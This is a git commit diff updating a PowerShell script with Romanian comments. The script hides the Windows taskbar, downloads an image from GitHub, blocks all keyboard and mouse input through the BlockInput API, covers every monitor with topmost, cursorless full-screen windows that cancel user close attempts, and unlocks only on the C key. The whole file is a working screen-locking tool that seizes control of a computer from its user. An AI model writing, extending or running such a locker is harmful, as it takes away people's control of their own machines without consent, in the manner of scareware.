cfd1c8a92ba0abae7016352613d54c3d31352e8d
diezul <55706727+diezul@users.noreply.github.com>
2025-04-10 22:21:31 +0300

    Update k.ps1

--- k.ps1
+++ k.ps1
@@ -1,5 +1,4 @@
 Add-Type -AssemblyName System.Windows.Forms
-
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -8,8 +7,6 @@ public class InputBlocker {
     public static extern bool BlockInput(bool fBlockIt);
 }
 "@
-
-# Ascunde taskbar-ul
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -20,49 +17,69 @@ public class TaskbarHider {
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
+
+# Ascunde taskbar
 $hWnd = [TaskbarHider]::FindWindow("Shell_TrayWnd", "")
 [TaskbarHider]::ShowWindow($hWnd, 0)
 
-# Descarcă poza
+# Descarcă poza dacă nu există
 $tempImage = "$env:TEMP\poza_laptop.jpg"
 if (-not (Test-Path $tempImage)) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $tempImage
 }
 
-# Blochează tot input-ul
+# Blochează input
 [InputBlocker]::BlockInput($true)
 
-# Creare formular full-screen
-$form = New-Object Windows.Forms.Form
-$form.WindowState = 'Maximized'
-$form.FormBorderStyle = 'None'
-$form.TopMost = $true
-$form.BackColor = 'Black'
-$form.KeyPreview = $true
-$form.Cursor = [System.Windows.Forms.Cursors]::None
-$form.ShowInTaskbar = $false  # <== AICI dispare din taskbar
+# Lista ferestrelor pentru fiecare monitor
+$forms = @()
 
-# Poza
-$pictureBox = New-Object Windows.Forms.PictureBox
-$pictureBox.ImageLocation = $tempImage
-$pictureBox.SizeMode = 'Zoom'
-$pictureBox.Dock = 'Fill'
-$form.Controls.Add($pictureBox)
+# Creați câte o fereastră per ecran
+[System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
+    $screen = $_
 
-# Deblochează doar la tasta C
-$form.Add_KeyDown({
-    if ($_.KeyCode -eq 'C') {
-        [TaskbarHider]::ShowWindow($hWnd, 1)  # Show taskbar again
-        [InputBlocker]::BlockInput($false)
-        $form.Close()
-    }
-})
+    $form = New-Object Windows.Forms.Form
+    $form.StartPosition = 'Manual'
+    $form.Bounds = $screen.Bounds
+    $form.FormBorderStyle = 'None'
+    $form.TopMost = $true
+    $form.BackColor = 'Black'
+    $form.KeyPreview = $true
+    $form.ShowInTaskbar = $false
+    $form.Cursor = [System.Windows.Forms.Cursors]::None
 
-# Anti Alt+F4 (partial)
-$form.Add_FormClosing({
-    if ($_.CloseReason -eq "UserClosing") {
-        $_.Cancel = $true
-    }
-})
+    $pictureBox = New-Object Windows.Forms.PictureBox
+    $pictureBox.ImageLocation = $tempImage
+    $pictureBox.SizeMode = 'Zoom'
+    $pictureBox.Dock = 'Fill'
+    $form.Controls.Add($pictureBox)
 
-$form.ShowDialog()
+    # Închidere doar cu C
+    $form.Add_KeyDown({
+        if ($_.KeyCode -eq 'C') {
+            foreach ($f in $forms) {
+                $f.Close()
+            }
+
+            [TaskbarHider]::ShowWindow($hWnd, 1)
+            [InputBlocker]::BlockInput($false)
+        }
+    })
+
+    # Previi Alt+F4 (parțial)
+    $form.Add_FormClosing({
+        if ($_.CloseReason -eq "UserClosing") {
+            $_.Cancel = $true
+        }
+    })
+
+    $forms += $form
+}
+
+# Afișează toate ferestrele
+foreach ($f in $forms) {
+    $null = $f.Show()
+}
+
+# Run loop pe prima fereastră
+[System.Windows.Forms.Application]::Run($forms[0])
